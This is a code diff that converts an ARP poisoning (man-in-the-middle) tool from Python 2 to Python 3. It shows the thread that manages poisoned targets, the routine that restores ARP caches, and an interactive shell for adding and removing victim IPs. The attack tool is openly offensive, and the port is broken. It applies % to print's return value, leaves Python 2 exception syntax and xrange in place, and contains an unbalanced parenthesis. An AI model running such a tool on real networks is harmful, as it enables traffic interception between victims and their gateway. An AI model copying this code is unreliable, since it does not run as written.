@@ -1,4 +1,4 @@
-#!/usr/bin/env python2
+#!/usr/bin/env python3
 import sys
 import argparse
 import threading
@@ -62,7 +62,7 @@ def start_poison_thread(targets, gateway, control_queue, attacker_MAC):
         except Empty:
             # The Empty exception is thrown when there is no element in the
             # queue. Something clearly is not working as it should...
-            print 'Something broke, your queue idea sucks.'
+            print ('Something broke, your queue idea sucks.')
 
         cmd = item[CMD].lower()
         if cmd in ['quit', 'exit', 'stop', 'leave']:
@@ -77,30 +77,30 @@ def start_poison_thread(targets, gateway, control_queue, attacker_MAC):
                 targets.remove(item[TARGET])
                 restore_ARP_caches([item[TARGET]], gateway, False)
             except ValueError:
-                print "%s not in target list" % item[TARGET][0]
+                print ("%s not in target list") % item[TARGET][0]
 
         elif cmd in ['list', 'show', 'status']:
-            print 'Current targets:'
-            print 'Gateway: %s (%s)' % gateway
+            print ('Current targets:')
+            print ('Gateway: %s (%s)') % gateway
             for t in targets:
-                print "%s (%s)" % t
+                print ("%s (%s)") % t
     # we are done, reset every host
     restore_ARP_caches(targets, gateway)
 
 
 def restore_ARP_caches(targets, gateway, verbose=True):
     # send correct ARP responses to the targets and the gateway
-    print 'Stopping the attack, restoring ARP cache'
+    print ('Stopping the attack, restoring ARP cache')
     for i in xrange(3):
         if verbose:
-            print "ARP %s is at %s" % (gateway[IP], gateway[MAC])
+            print ("ARP %s is at %s") % (gateway[IP], gateway[MAC])
         for t in targets:
             if verbose:
-                print "ARP %s is at %s" % (t[IP], t[MAC])
+                print ("ARP %s is at %s") % (t[IP], t[MAC])
             send_ARP(t[IP], t[MAC], gateway[IP], gateway[MAC])
             send_ARP(gateway[IP], gateway[MAC], t[IP], t[MAC])
         time.sleep(1)
-    print 'Restored ARP caches'
+    print ('Restored ARP caches')
 
 
 def send_ARP(destination_IP, destination_MAC, source_IP, source_MAC):
@@ -119,7 +119,7 @@ def main():
     interface = args.interface or get_working_if()
     attacker_MAC = get_if_hwaddr(interface)
 
-    print 'Using interface %s (%s)' % (interface, attacker_MAC)
+    print ('Using interface %s (%s)') % (interface, attacker_MAC)
     try:
         # args.targets should be a comma-separated string of IP-Adresses
         # -t 10.1.1.2,10.1.1.32,10.1.1.45
@@ -129,7 +129,7 @@ def main():
     except Exception, e:
         # Exception most likely because get_MAC failed, check if -t or -g are
         # actually valid IP addresses
-        print e.message
+        print (e.message)
         sys.exit(1)
 
     # same as above, gateway is a (IP, MAC) tuple
@@ -137,7 +137,7 @@ def main():
         # args.gateway is a single IP address
         gateway = (args.gateway, get_MAC(interface, args.gateway))
     except Exception, e:
-        print e.message
+        print (e.message)
         sys.exit(2)
 
     # create and start the poison thread
@@ -155,10 +155,10 @@ def main():
             if command:
                 cmd = command[CMD].lower()
                 if cmd in ['help', '?']:
-                    print "add <IP>: add IP address to target list\n" + \
-                          "del <IP>: remove IP address from target list\n" + \
-                          "list: print all current targets\n" + \
-                          "exit: stop poisoning and exit"
+                    print ("add <IP>: add IP address to target list\n") + \
+                          ("del <IP>: remove IP address from target list\n") + \
+                          ("list: print all current targets\n") + \
+                          ("exit: stop poisoning and exit")
 
                 elif cmd in ['quit', 'exit', 'stop', 'leave']:
                     control_queue.put(('quit',))
@@ -166,13 +166,13 @@ def main():
 
                 elif cmd in ['add', 'insert', 'del', 'delete', 'remove']:
                     ip = command[TARGET]
-                    print "IP: " + ip
+                    print ("IP: ") + ip
                     try:
                         t = (ip, get_MAC(interface, ip))
                         control_queue.put((cmd, t))
                     except Exception, e:
-                        print 'Can not add %s' % IP
-                        print e.message
+                        print ('Can not add %s') % IP
+                        print (e.message()
 
                 elif cmd in ['list', 'show', 'status']:
                     control_queue.put((cmd,))
